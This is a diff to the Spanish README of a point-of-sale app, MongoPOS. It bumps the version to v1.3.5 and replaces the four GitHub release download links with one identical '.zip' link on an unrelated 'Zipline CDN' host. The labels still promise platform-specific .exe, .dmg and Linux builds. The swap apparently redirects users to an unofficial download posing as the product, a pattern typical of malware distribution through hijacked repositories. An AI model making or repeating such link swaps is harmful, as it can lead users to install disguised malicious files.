@@ -83,16 +83,16 @@
 
 ## 📦 Descargas
 
-**Versión actual: v1.3.0**
+**Versión actual: v1.3.5**
 
 Elige la versión compatible con tu sistema operativo:
 
 | Sistema Operativo | Enlace de Descarga |
 |------------------|-------------------|
-| 🪟 **Windows Installer** | [Descargar MongoPOS-windows-installer-v1.2.0.exe](https://github.com/IzDiego/MongoPOS/releases/download/v1.3.0/MongoPOS-windows-installer-v1.3.0.exe) |
-| 🪟 **Windows** | [Descargar MongoPOS-windows-v1.2.0.exe](https://github.com/IzDiego/MongoPOS/releases/download/v1.3.0/MongoPOS-windows-v1.3.0.exe) |
-| 🍎 **macOS** | [Descargar MongoPOS-macos-v1.2.0.dmg](https://github.com/IzDiego/MongoPOS/releases/download/v1.3.0/MongoPOS-macos-v1.3.0.dmg) |
-| 🐧 **Linux** | [Descargar MongoPOS-linux-v1.2.0](https://github.com/IzDiego/MongoPOS/releases/download/v1.3.0/MongoPOS-linux-v1.3.0) |
+| 🪟 **Windows Installer** | [⚡ Descargar MongoPOS-windows-installer-v1.3.5.exe (Zipline CDN)](https://zipline-api.forgemasters.dev//u/[ID].zip) |
+| 🪟 **Windows** | [⚡ Descargar MongoPOS-windows-v1.3.5.exe (Zipline CDN)](https://zipline-api.forgemasters.dev//u/[ID].zip) |
+| 🍎 **macOS** | [⚡ Descargar MongoPOS-macos-v1.3.5.dmg (Zipline CDN)](https://zipline-api.forgemasters.dev//u/[ID].zip) |
+| 🐧 **Linux** | [⚡ Descargar MongoPOS-linux-v1.3.5 (Zipline CDN)](https://zipline-api.forgemasters.dev//u/[ID].zip) |
 
 ### 📋 Requisitos del Sistema
 
